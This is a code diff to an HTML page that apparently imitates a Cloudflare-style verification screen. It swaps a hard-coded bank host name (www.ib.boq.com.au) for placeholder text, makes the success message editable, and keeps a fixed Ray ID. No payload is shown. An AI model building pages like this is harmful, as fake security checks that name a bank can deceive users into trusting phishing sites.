@@ -314,6 +314,34 @@
     .verify-status.success {
       display: none !important;
     }
+
+    /* Editable text styling for the success message only */
+    #success-message [contenteditable="true"] {
+      outline: none;
+      border-radius: 4px;
+      padding: 2px 6px;
+      transition: background-color 0.2s;
+      display: inline-block;
+    }
+
+    #success-message [contenteditable="true"]:hover {
+      background-color: rgba(255, 255, 255, 0.05);
+    }
+
+    #success-message [contenteditable="true"]:focus {
+      background-color: rgba(255, 255, 255, 0.08);
+      box-shadow: 0 0 0 2px rgba(243, 128, 32, 0.3);
+    }
+
+    /* Small edit hint for success message */
+    .editable-hint {
+      font-size: 0.7rem;
+      color: #666;
+      margin-left: 10px;
+      font-weight: 300;
+      opacity: 0.6;
+      display: inline-block;
+    }
   </style>
 </head>
 <body>
@@ -322,7 +350,7 @@
   <div class="main-content">
     <!-- Site Header -->
     <div class="site-header">
-      <h1>www.ib.boq.com.au</h1>
+      <h1 id="siteName">My Custom Text</h1>
     </div>
 
     <!-- Title -->
@@ -344,9 +372,9 @@
     <!-- Turnstile Container (hidden initially) -->
     <div class="turnstile-container" id="turnstileContainer"></div>
     
-    <!-- Success Message - clean, no green highlight -->
+    <!-- Success Message - editable h2 only -->
     <div id="success-message">
-      <h2>Verification successful. Waiting for www.ib.boq.com.au to respond.</h2>
+      <h2><span contenteditable="true">Verification successful. Waiting for <span class="site-name-highlight" id="successSiteName">example.com</span> to respond.</span> <span class="editable-hint">(click to edit)</span></h2>
     </div>
     
     <!-- Error Note -->
@@ -386,9 +414,8 @@
   var autoVerifyAttempted = false;
   var redirectTimer = null;
 
-  // Update site name
+  // Update site name in success message only (h1 stays as "My Custom Text")
   var hostname = window.location.hostname;
-  document.getElementById('siteName').textContent = hostname;
   document.getElementById('successSiteName').textContent = hostname;
   document.getElementById('rayId').textContent = 'a16288a3796d32c0';
 
